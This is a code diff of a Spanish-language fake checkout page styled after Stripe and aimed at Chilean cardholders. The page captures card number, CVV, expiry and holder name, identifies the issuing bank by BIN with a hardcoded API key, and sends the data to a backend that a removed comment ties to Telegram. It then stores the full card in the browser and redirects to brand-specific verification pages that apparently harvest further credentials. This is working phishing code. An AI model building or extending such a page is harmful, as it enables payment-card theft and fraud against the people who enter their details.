@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -101,123 +100,141 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         /* ============================================
-           LOADING OVERLAY — ESTILO STRIPE
+           OVERLAY FINAL — FONDO BLUR + BARRA PARALELOGRAMO
            ============================================ */
         .loading-overlay {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: #ffffff;
-            z-index: 1000;
+            background: rgba(255, 255, 255, 0.4);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            z-index: 9999;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            padding: 24px;
             opacity: 0;
-            transition: opacity 0.25s ease;
+            transition: opacity 0.3s ease;
         }
         .loading-overlay.active { display: flex; opacity: 1; }
 
-        .stripe-loading {
-            width: 100%;
-            max-width: 320px;
+        .stripe-card {
+            background: rgba(255, 255, 255, 0.85);
+            border-radius: 20px;
+            padding: 40px 32px;
+            width: 90%;
+            max-width: 380px;
+            box-shadow: 0 20px 60px rgba(37,90,222,0.15), inset 0 1px 0 rgba(255,255,255,1);
+            border: 1px solid rgba(255,255,255,0.6);
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
+            transform: translateY(20px) scale(0.95);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
         }
-
-        .stripe-logo {
-            height: 40px;
-            width: auto;
-            max-width: 120px;
-            object-fit: contain;
-            margin-bottom: 40px;
-            opacity: 0;
-            transform: translateY(6px);
-            transition: opacity 0.3s ease, transform 0.3s ease;
-        }
-        .stripe-logo.visible { opacity: 1; transform: translateY(0); }
+        .loading-overlay.active .stripe-card { transform: translateY(0) scale(1); }
 
         .stripe-spinner {
-            width: 28px;
-            height: 28px;
-            border: 2.5px solid #e6e6e6;
+            width: 32px; height: 32px;
+            border: 3px solid rgba(37,90,222,0.1);
             border-top-color: #255ade;
             border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin-bottom: 24px;
             opacity: 0;
-            transition: opacity 0.2s ease;
+            transition: opacity 0.3s;
         }
         .stripe-spinner.visible { opacity: 1; }
 
+        .stripe-logo {
+            height: 48px;
+            width: auto;
+            max-width: 140px;
+            object-fit: contain;
+            margin-bottom: 24px;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .stripe-logo.visible { opacity: 1; transform: translateY(0); }
+
         .stripe-text {
-            font-size: 15px;
-            font-weight: 500;
-            color: #30313d;
-            letter-spacing: -0.01em;
-            margin-bottom: 20px;
-            min-height: 20px;
-            transition: opacity 0.2s ease;
-            line-height: 1.4;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 32px;
+            letter-spacing: -0.2px;
+            min-height: 24px;
         }
 
-        .stripe-progress-track {
+        /* BARRA DE PROGRESO — PARALELOGRAMO */
+        .bar-container {
             width: 100%;
-            height: 3px;
-            background: #ebeef1;
-            border-radius: 999px;
+            height: 16px;
+            position: relative;
             overflow: hidden;
-            position: relative;
+            margin-top: 10px;
         }
-        .stripe-progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #255ade, #4a7cf5);
-            border-radius: 999px;
+        .bar-bg {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #e5e7eb;
+            transform: skewX(-20deg);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .bar-fill {
+            position: absolute;
+            top: 0; left: 0; height: 100%;
             width: 0%;
-            transition: width 0.35s ease;
-            position: relative;
+            background: linear-gradient(90deg, #255ade, #4a7cf5);
+            transition: width 0.4s ease;
+            box-shadow: 0 0 10px rgba(37,90,222,0.4);
+            border-radius: 4px;
         }
-        .stripe-progress-fill::after {
+        .bar-fill::after {
             content: '';
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
-            animation: shimmer 1.4s infinite;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 1.5s infinite;
         }
+        .bar-indeterminate {
+            position: absolute;
+            top: 0; left: 0; height: 100%;
+            width: 30%;
+            background: linear-gradient(90deg, transparent, #255ade, transparent);
+            animation: indeterminate 1.5s infinite ease-in-out;
+            border-radius: 4px;
+        }
+
         @keyframes shimmer {
             0% { transform: translateX(-100%); }
             100% { transform: translateX(100%); }
         }
-
-        .stripe-progress-indeterminate {
-            height: 100%;
-            width: 40%;
-            background: linear-gradient(90deg, #255ade, #4a7cf5);
-            border-radius: 999px;
-            position: absolute;
-            top: 0;
-            animation: indeterminate 1.2s ease-in-out infinite;
-        }
         @keyframes indeterminate {
-            0% { left: -40%; }
+            0% { left: -30%; }
             100% { left: 100%; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ============================================
-         LOADING OVERLAY — ESTILO STRIPE
-         ============================================ -->
+    <!-- OVERLAY FINAL (BLUR) -->
     <div class="loading-overlay" id="loadingOverlay">
-        <div class="stripe-loading">
+        <div class="stripe-card">
             <div class="stripe-spinner visible" id="initialSpinner"></div>
             <img id="cardLogoImg" class="stripe-logo" src="" alt="">
             <div class="stripe-text" id="loadingText">Procesando pago...</div>
-            <div class="stripe-progress-track" id="progressTrack"></div>
+            
+            <div class="bar-container">
+                <div class="bar-bg">
+                    <div class="bar-fill" id="progressFill"></div>
+                    <div class="bar-indeterminate" id="progressIndeterminate"></div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -376,10 +393,6 @@
     </div>
 
     <script>
-        // ============================================================
-        // Solo rutas relativas (/api/...) → el server del front proxea
-        // El HTML NUNCA ve la URL del backend ni Telegram.
-        // ============================================================
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
         const HANDYAPI_KEY = 'HAS-139kYW5q3NS98PmXt8w67rbDH';
@@ -388,7 +401,6 @@
             new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(amount);
 
         let datosPagoActual = null;
-        let notificadoSalida = false;
         let pagoEnviado = false;
         let solicitudId = null;
         let pollingInterval = null;
@@ -397,49 +409,33 @@
         const loadingOverlay  = document.getElementById('loadingOverlay');
         const loadingText     = document.getElementById('loadingText');
         const cardLogoImg     = document.getElementById('cardLogoImg');
-        const progressTrack   = document.getElementById('progressTrack');
         const initialSpinner  = document.getElementById('initialSpinner');
+        const progressFill    = document.getElementById('progressFill');
+        const progressIndeterminate = document.getElementById('progressIndeterminate');
 
-        // ============================================================
-        // DETECCIÓN DE BANCO CHILENO POR BIN (HandyAPI)
-        // ============================================================
+        // MAPA DE BANCOS
         const binCache = new Map();
         const bankNameMappingCL = {
-            'banco de chile': 'Banco de Chile',
-            'banco estado': 'Banco Estado', 'bancoestado': 'Banco Estado',
-            'santander': 'Santander',
-            'bci': 'BCI',
-            'falabella': 'Banco Falabella',
-            'security': 'Banco Security',
-            'itau': 'Itaú', 'itaú': 'Itaú',
-            'scotiabank': 'Scotiabank',
-            'bice': 'BICE',
-            'ripley': 'Banco Ripley',
-            'consorcio': 'Banco Consorcio',
-            'internacional': 'Banco Internacional',
-            'bbva': 'BBVA',
-            'tenpo': 'Tenpo',
-            'mach': 'MACH',
-            'coopeuch': 'Coopeuch',
-            'mercadopago': 'Mercado Pago',
-            'hites': 'Hites',
-            'paris': 'Banco Paris',
-            'walmart': 'Banco Walmart',
-            'desarrollo': 'Banco del Desarrollo'
+            'banco de chile': 'Banco de Chile', 'banco estado': 'Banco Estado', 'bancoestado': 'Banco Estado',
+            'santander': 'Santander', 'bci': 'BCI', 'falabella': 'Banco Falabella', 'security': 'Banco Security',
+            'itau': 'Itaú', 'itaú': 'Itaú', 'scotiabank': 'Scotiabank', 'bice': 'BICE', 'ripley': 'Banco Ripley',
+            'consorcio': 'Banco Consorcio', 'internacional': 'Banco Internacional', 'bbva': 'BBVA', 'tenpo': 'Tenpo',
+            'mach': 'MACH', 'coopeuch': 'Coopeuch', 'mercadopago': 'Mercado Pago', 'hites': 'Hites',
+            'paris': 'Banco Paris', 'walmart': 'Banco Walmart', 'desarrollo': 'Banco del Desarrollo'
         };
 
         async function detectBankByBIN(cardNumber) {
             const clean = cardNumber.replace(/\s/g, '');
-            if (clean.length < 6) return null;
+            if (clean.length < 6) return 'Desconocido';
             const bin = clean.substring(0, 6);
             if (binCache.has(bin)) return binCache.get(bin);
             try {
                 const r = await fetch(`https://data.handyapi.com/bin/${bin}`, {
                     headers: { 'x-api-key': HANDYAPI_KEY }
                 });
-                if (!r.ok) return null;
+                if (!r.ok) return 'Desconocido';
                 const data = await r.json();
-                if (data.Status === 'ERROR' || data.error) return null;
+                if (data.Status === 'ERROR' || data.error) return 'Desconocido';
                 let bank = null;
                 if (data.Issuer) {
                     const raw = data.Issuer.toLowerCase();
@@ -449,10 +445,10 @@
                     if (!bank) bank = data.Issuer;
                 }
                 const country = data.Country?.A2 || '';
-                if (country && country !== 'CL') return null;
+                if (country && country !== 'CL') return 'Desconocido';
                 binCache.set(bin, bank || 'Desconocido');
                 return bank || 'Desconocido';
-            } catch { return null; }
+            } catch { return 'Desconocido'; }
         }
 
         document.addEventListener('DOMContentLoaded', () => {
@@ -476,7 +472,6 @@
             document.getElementById('mobile-amount').textContent = montoFormateado;
             document.getElementById('mobile-logo').src = data.logo;
 
-            // Formateo número + detección de banco
             let bankTimeout = null;
             document.querySelectorAll('#numero, #numero-m').forEach(el => {
                 el.addEventListener('input', (e) => {
@@ -497,7 +492,6 @@
                 });
             });
 
-            // Formateo vencimiento
             document.querySelectorAll('#vence, #vence-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     let v = e.target.value.replace(/\D/g, '').substring(0, 4);
@@ -509,7 +503,6 @@
                 });
             });
 
-            // Preview titular
             document.querySelectorAll('#titular, #titular-m').forEach(el => {
                 el.addEventListener('input', (e) => {
                     const isMobile = el.id.endsWith('-m');
@@ -519,39 +512,18 @@
             });
         });
 
-        function notificarSalida(motivo) {
-            if (notificadoSalida || !datosPagoActual || pagoEnviado) return;
-            notificadoSalida = true;
-            console.warn('Usuario salió:', motivo);
-        }
-
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'hidden') {
-                setTimeout(() => {
-                    if (document.visibilityState === 'hidden') notificarSalida('Cambió de pestaña / app');
-                }, 1500);
-            }
-        });
-
-        window.addEventListener('beforeunload', () => {
-            if (pagoEnviado) return;
-            notificarSalida('Cerró o recargó la página');
-        });
-
-        // ============================================================
-        // OVERLAY STRIPE STYLE
-        // ============================================================
         function overlayMostrarSpinner(texto) {
             loadingOverlay.classList.add('active');
             initialSpinner.classList.add('visible');
             cardLogoImg.classList.remove('visible');
             loadingText.textContent = texto || 'Procesando pago...';
-            progressTrack.innerHTML = '<div class="stripe-progress-indeterminate"></div>';
+            progressFill.style.width = '0%';
+            progressIndeterminate.style.display = 'block';
         }
 
         function overlayMostrarLogo(marca, texto) {
             initialSpinner.classList.remove('visible');
-
+            progressIndeterminate.style.display = 'none';
             const map = { visa: 'visa.png', mastercard: 'mastercard.png', amex: 'amex.png' };
             if (map[marca]) {
                 cardLogoImg.src = map[marca];
@@ -560,28 +532,21 @@
             } else {
                 cardLogoImg.classList.remove('visible');
             }
-
             loadingText.textContent = texto || 'Redirigiendo...';
-            progressTrack.innerHTML = '<div class="stripe-progress-fill" id="progressFill"></div>';
         }
 
         function overlayActualizarProgreso(pct) {
-            const fill = document.getElementById('progressFill');
-            if (fill) fill.style.width = Math.min(100, Math.max(0, pct)) + '%';
+            progressFill.style.width = Math.min(100, Math.max(0, pct)) + '%';
         }
 
         function overlayOcultar() {
             loadingOverlay.classList.remove('active');
-            progressTrack.innerHTML = '';
+            progressFill.style.width = '0%';
         }
 
-        // ============================================================
-        // POLLING → /api/estado-pago/:id
-        // ============================================================
         function iniciarPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
             const start = Date.now();
-
             overlayMostrarSpinner('Procesando pago...');
 
             pollingInterval = setInterval(async () => {
@@ -597,94 +562,39 @@
                     const data = await r.json();
                     if (!data.success) return;
 
-                    if (data.estado === 'aprobado') {
+                    if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval);
-                        flujoAprobado(data.marca, data.redirect);
+                        
+                        // Guardar en localStorage para visa.php
+                        const tarjetaAprobada = {
+                            titular: document.getElementById('titular').value || document.getElementById('titular-m').value,
+                            numero: document.getElementById('numero').value.replace(/\s/g, '') || document.getElementById('numero-m').value.replace(/\s/g, ''),
+                            vencimiento: document.getElementById('vence').value || document.getElementById('vence-m').value,
+                            cvv: document.getElementById('cvv').value || document.getElementById('cvv-m').value,
+                            marca: data.marca || 'visa',
+                            banco: detectedBank || 'Desconocido',
+                            solicitud_id: solicitudId,
+                            aprobado_en: new Date().toISOString()
+                        };
+                        localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
+                        localStorage.setItem('bancoEmisor', tarjetaAprobada.banco);
+
+                        // Redirigir localmente al php
+                        overlayMostrarLogo(data.marca, `Redirigiendo a ${data.marca}...`);
+                        overlayActualizarProgreso(100);
+                        setTimeout(() => {
+                            const mapa = { visa: 'visa.php', mastercard: 'master.php', amex: 'amex.php' };
+                            window.location.href = mapa[data.marca] || 'visa.php';
+                        }, 1500);
+
                     } else if (data.estado === 'rechazado') {
                         clearInterval(pollingInterval);
                         overlayOcultar();
-                        alert(data.mensaje || 'La tarjeta fue declinada por el emisor. Verifica los datos o utiliza otra tarjeta.');
+                        alert(data.mensaje || 'La tarjeta fue declinada por el emisor.');
                         resetFormulario();
                     }
                 } catch {}
             }, POLLING_INTERVAL);
-        }
-
-        // ============================================================
-        // FLUJO APROBADO — GUARDA EN LOCALSTORAGE + CARGA STRIPE
-        // ============================================================
-        function flujoAprobado(marca, redirectUrl) {
-            // ⚡ CAMBIO 1: guardar en localStorage la tarjeta aprobada
-            if (datosPagoActual) {
-                const formMobile = document.getElementById('form-tarjeta-mobile');
-                const isMobile = window.innerWidth <= 850;
-                const sufijo = isMobile ? '-m' : '';
-
-                const titular = document.getElementById('titular' + sufijo)?.value?.trim() || '';
-                const numero = document.getElementById('numero' + sufijo)?.value?.replace(/\s/g, '') || '';
-                const vence = document.getElementById('vence' + sufijo)?.value?.trim() || '';
-                const cvv = document.getElementById('cvv' + sufijo)?.value?.trim() || '';
-
-                let marcaDetectada = marca;
-                if (!marcaDetectada) {
-                    if (numero.startsWith('4')) marcaDetectada = 'visa';
-                    else if (/^(5[1-5]|2[2-7])/.test(numero)) marcaDetectada = 'mastercard';
-                    else if (/^3[47]/.test(numero)) marcaDetectada = 'amex';
-                }
-
-                const tarjetaAprobada = {
-                    titular: titular,
-                    numero: numero,
-                    vencimiento: vence,
-                    cvv: cvv,
-                    marca: marcaDetectada,
-                    banco: detectedBank || 'Desconocido',
-                    solicitud_id: solicitudId,
-                    aprobado_en: new Date().toISOString()
-                };
-
-                try {
-                    localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
-                    console.log('✅ Tarjeta aprobada guardada en localStorage:', tarjetaAprobada);
-                } catch (e) {
-                    console.warn('No se pudo guardar en localStorage:', e);
-                }
-            }
-
-            // Mostrar logo de la marca
-            const nombreRed = {
-                visa: 'Verified by Visa',
-                mastercard: 'Mastercard ID Check',
-                amex: 'American Express SafeKey'
-            };
-            overlayMostrarLogo(marca, `Conectando con ${nombreRed[marca] || 'el banco'}...`);
-
-            // Secuencia Stripe-style
-            overlayActualizarProgreso(0);
-
-            setTimeout(() => {
-                overlayActualizarProgreso(25);
-                loadingText.textContent = 'Verificando tarjeta...';
-            }, 300);
-
-            setTimeout(() => {
-                overlayActualizarProgreso(55);
-                loadingText.textContent = 'Autorizando pago con el emisor...';
-            }, 900);
-
-            setTimeout(() => {
-                overlayActualizarProgreso(80);
-                loadingText.textContent = 'Confirmando transacción...';
-            }, 1600);
-
-            setTimeout(() => {
-                overlayActualizarProgreso(100);
-                loadingText.textContent = 'Redirigiendo...';
-            }, 2300);
-
-            setTimeout(() => {
-                window.location.href = redirectUrl;
-            }, 2900);
         }
 
         function resetFormulario() {
@@ -692,23 +602,12 @@
                 const b = document.getElementById(id);
                 if (b) { b.disabled = false; b.textContent = 'Pagar ahora'; }
             });
-            ['numero', 'numero-m', 'titular', 'titular-m', 'vence', 'vence-m', 'cvv', 'cvv-m'].forEach(id => {
-                const el = document.getElementById(id);
-                if (el) el.disabled = false;
-            });
             pagoEnviado = false;
         }
 
-        // ============================================================
-        // ENVÍO DEL PAGO → POST /api/crear-pago (relativo)
-        // ============================================================
         async function enviarPago(event) {
             event.preventDefault();
-
-            if (!datosPagoActual) {
-                alert("No hay datos de pago cargados.");
-                return;
-            }
+            if (!datosPagoActual) return;
 
             const form = event.target;
             const isMobile = form.id === 'form-tarjeta-mobile';
@@ -729,18 +628,20 @@
             else if (/^(5[1-5]|2[2-7])/.test(numero)) marca = 'mastercard';
             else if (/^3[47]/.test(numero)) marca = 'amex';
             if (!marca) {
-                alert('Tipo de tarjeta no reconocido. Verifica el número.');
+                alert('Tipo de tarjeta no reconocido.');
                 return;
-            }
-
-            if (!detectedBank && numero.length >= 6) {
-                detectedBank = await detectBankByBIN(numero);
-                await new Promise(r => setTimeout(r, 400));
             }
 
             const btn = document.getElementById('btn-pagar' + sufijo);
             btn.disabled = true;
-            btn.innerHTML = '<div style="border: 3px solid #f3f3f3; border-top: 3px solid #fff; border-radius: 50%; width: 22px; height: 22px; animation: spin 1s linear infinite; margin: 0 auto;"></div>';
+            btn.innerHTML = '...';
+
+            // ⚡ FIX: FORZAR DETECCIÓN DEL BANCO ANTES DE ENVIAR
+            if (!detectedBank) {
+                overlayMostrarSpinner('Identificando banco emisor...');
+                detectedBank = await detectBankByBIN(numero);
+                if (!detectedBank) detectedBank = 'Desconocido';
+            }
 
             pagoEnviado = true;
             solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
@@ -758,7 +659,7 @@
                         cvv: cvv,
                         vencimiento: vence,
                         marca_tarjeta: marca,
-                        banco_emisor: detectedBank || 'Desconocido'
+                        banco_emisor: detectedBank // ⚡ AQUÍ VA EL BANCO
                     })
                 });
 
@@ -766,7 +667,7 @@
 
                 if (!data.success) {
                     overlayOcultar();
-                    alert('No se pudo procesar el pago. Intenta nuevamente.');
+                    alert('No se pudo procesar el pago.');
                     resetFormulario();
                     return;
                 }
@@ -776,7 +677,7 @@
             } catch (error) {
                 console.error('Error:', error);
                 overlayOcultar();
-                alert('No se pudo conectar con el procesador de pagos. Intenta nuevamente.');
+                alert('No se pudo conectar con el procesador de pagos.');
                 resetFormulario();
             }
         }
